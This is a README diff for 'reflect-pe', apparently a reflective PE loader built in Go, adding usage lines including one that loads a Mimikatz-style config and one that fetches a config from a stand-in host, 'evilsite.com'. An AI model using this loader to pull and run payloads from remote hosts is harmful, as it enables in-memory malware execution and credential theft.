@@ -18,6 +18,11 @@ cd reflect-pe
 go build -v .
 ```
 Run it and enjoy
+```
+reflect-pe.exe
+reflect-pe.exe config_mimi.yml
+reflect-pe.exe http://www.evilsite.com/config.yml
+```
 
 ## Config
 ```
